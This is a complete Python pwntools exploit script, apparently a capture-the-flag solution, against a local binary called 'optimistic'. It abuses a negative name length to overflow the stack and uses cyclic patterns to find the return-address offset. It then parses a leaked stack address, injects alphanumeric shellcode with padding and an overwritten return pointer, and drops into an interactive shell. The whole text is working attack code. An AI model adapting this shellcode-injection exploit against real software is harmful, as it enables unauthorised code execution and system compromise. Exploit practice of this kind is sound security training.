#!/usr/bin/env python3

from pwn import *

#Make string address as an unpacked value
def make_address_valid(stack_address): 
	stack_address = [chr(int(stack_address[i:i+2],16))for i in range(2,len(stack_address),2)] #Splitting into chars
	stack_address = ''.join(stack_address) #Joining them together
	stack_address = stack_address.rjust(8,'\x00') #Make sure our address is 8 bytes
	stack_address = u64(stack_address,endian='big') #Unpacking to int for further manipulation
	return (stack_address - 96)

#Find the buffer overflow offset to overwrite ip
def find_ip_offset(size): 
	p = process('./optimistic')
	p.sendlineafter(':','y')
	p.sendlineafter('Email:','noder')
	p.sendlineafter('Age:','noder')
	p.sendlineafter('Length of name:','-1')
	p.sendlineafter('Name:',cyclic(size,n=8))
	p.wait()
	core = p.corefile
	offset = cyclic_find(core.read(core.rsp, 8), n=8)
	log.success(f'Found ip offset at: {str(offset)}')
	p.close()
	return offset

#Starting the process
context.log_level = 'debug'
binary = './optimistic'
io = process(binary)

#Step zero - Enumerate Binary
elf = context.binary = ELF(binary,checksec=False) #Automatically get contex,arch,os etc..
rsp_offset = find_ip_offset(200)

#Step one - Pulling stack address
io.sendlineafter(': ','y')
stack_address = io.recv().decode().strip().split()[-6]
stack_address = make_address_valid(stack_address)
log.success(f'Leaked stack address at: {hex(stack_address)}')

#Step two - Creating the payload
shellcode = b'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'
padding = b'a' * (rsp_offset - len(shellcode))
payload = shellcode + padding + p64(stack_address)

#Step 3 - Triggering the shellcode
io.sendline('email')
io.sendlineafter('Age: ','age')
io.sendlineafter('Length of name: ','-1')
io.sendlineafter('Name: ',payload)

#Step 4 - Getting a shell!
io.interactive()

